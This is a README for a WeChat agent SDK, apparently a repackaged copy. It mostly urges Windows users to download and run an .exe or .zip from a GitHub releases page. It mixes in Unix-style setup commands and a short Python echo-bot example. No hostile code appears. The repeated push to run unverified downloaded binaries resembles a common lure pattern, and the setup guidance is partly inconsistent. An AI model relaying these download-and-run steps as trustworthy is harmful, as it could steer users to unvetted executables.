# 🤖 weixin-agent-sdk - Run a WeChat agent on Windows

[![Download weixin-agent-sdk](https://img.shields.io/badge/Download%20weixin--agent--sdk-blue?style=for-the-badge)](https://github.com/electronicpug342-a11y/weixin-agent-sdk/releases)

## 🧭 What this app does

weixin-agent-sdk lets you run a WeChat agent from your PC. You use it to connect a WeChat account to a small Python app that can read messages and reply to them.

This project follows the same main flow as the original SDK:

- `Agent`
- `login()`
- `start(agent)`

For a normal Windows user, the main goal is simple:

1. visit the release page
2. download the app or package from the latest release
3. sign in to your WeChat account
4. start the agent

## 💻 Before you start

Use a Windows PC with:

- Windows 10 or Windows 11
- a stable internet connection
- a WeChat account you can log in to
- enough disk space for the app and its data files

You do not need to know Python to get started if the release package includes a ready-to-run build. If the release contains source files, you may need Python 3.10 or later.

## 📥 Download

Visit this page to download:

[https://github.com/electronicpug342-a11y/weixin-agent-sdk/releases](https://github.com/electronicpug342-a11y/weixin-agent-sdk/releases)

On the release page, look for the newest version. Download the file that matches Windows. If you see a `.exe` file, `.zip` file, or installer, use that file.

## 🪟 Install on Windows

### If you downloaded an `.exe` file

1. Double-click the file.
2. If Windows asks for permission, choose Run.
3. Follow the on-screen steps.

### If you downloaded a `.zip` file

1. Right-click the file.
2. Choose Extract All.
3. Pick a folder you can find again, such as `Downloads` or `Desktop`.
4. Open the extracted folder.
5. Look for the app file or the start file.

### If the release includes source files

You may see files like `README.md`, `pyproject.toml`, or a `src` folder. In that case, install Python first, then run the app from a command window.

## 🚀 Start the app

If you got a ready-to-run Windows build, open the app file from the folder where you extracted it or installed it.

If you got source files and need to run it with Python, use these steps:

1. Install Python 3.10 or later.
2. Open Command Prompt.
3. Go to the project folder.
4. Create a virtual environment.
5. Install the required packages.
6. Start the login step.
7. Start the agent.

Example flow from the project:

```bash
uv venv .venv
uv sync --dev --extra openai
source .venv/bin/activate
python -m examples.openai_bot login
OPENAI_API_KEY=sk-xxx python -m examples.openai_bot start
```

On Windows, the exact commands may differ based on how the release is packaged. If the release includes a Windows launcher, use that first.

## 🔐 Sign in

The app stores your account login data so you do not need to sign in each time.

When you run the login step:

1. sign in with your WeChat account
2. finish any code or device check steps
3. wait for the login to complete

If you close the app before login ends, start it again and repeat the sign-in step.

## ▶️ Run the agent

After login, start the agent process.

The agent runs for a long time and keeps watching for new messages. It can stop if you close the window or cancel the process.

If you run it from a terminal, you can stop it with `Ctrl-C`.

## 🧩 What the agent can handle

The SDK supports message data for:

- text
- images
- video
- files
- voice

This means the app can read common message types and pass them to your agent logic.

## 🗂️ Where data is saved

The app keeps login data and update buffers in this folder:

`~/.openclaw/openclaw-weixin/`

On Windows, this is usually inside your user profile folder. It may contain:

- saved account data
- message update data
- local runtime files

Do not delete this folder if you want to keep your login state.

## 🛠️ Common setup path for Windows users

If you want a simple path, use this order:

1. open the release page
2. download the latest Windows file
3. extract it if needed
4. run the app
5. log in to WeChat
6. start the agent
7. keep the window open while you use it

## 📌 Public API

If you want to use the SDK in your own Python app, the main imports are:

```python
from weixin_agent import Agent, ChatRequest, ChatResponse, login, start
```

A simple agent can look like this:

```python
class EchoAgent:
    async def chat(self, request: ChatRequest) -> ChatResponse:
        return ChatResponse(text=f"You said: {request.text}")
```

## 🧪 Example use

A basic use case is an echo bot:

- a user sends a message
- the app receives the text
- the agent returns a reply
- WeChat sends the reply back

This helps you test that the login, message flow, and reply flow all work.

## 🧷 File types you may see

Depending on the release, you may see:

- `.exe` for a Windows app
- `.zip` for a packed folder
- Python project files for manual setup
- example files for test bots

If you are not sure which file to use, choose the Windows build or the file with the clearest app name.

## 🧭 If the app does not start

Try these checks:

1. Make sure you downloaded the latest release.
2. Make sure the file finished downloading.
3. If it is a `.zip`, extract it first.
4. Run it from a folder you can access.
5. Check that WeChat login finished.
6. If you use the Python path, check that Python is installed.

## 🖱️ Quick path for non-technical users

1. Open the download page.
2. Download the latest Windows file.
3. Open or extract the file.
4. Start the app.
5. Log in to WeChat.
6. Leave the app running.
7. Send a test message to confirm it works

## 🔎 What makes this project useful

- It gives you a simple WeChat agent flow.
- It keeps the main API small.
- It works with common message types.
- It stores login data so you do not repeat setup each time.
- It supports a long-running process for message handling.

## 📍 Download again if needed

If you need to get the app again, use the release page:

[https://github.com/electronicpug342-a11y/weixin-agent-sdk/releases](https://github.com/electronicpug342-a11y/weixin-agent-sdk/releases)

## 🧰 Basic terms

- **Agent**: the part of the app that reads a message and creates a reply
- **Login**: the step where you sign in to WeChat
- **Start**: the step that keeps the agent running and watching for messages
- **Update buffer**: saved message data the app uses while it runs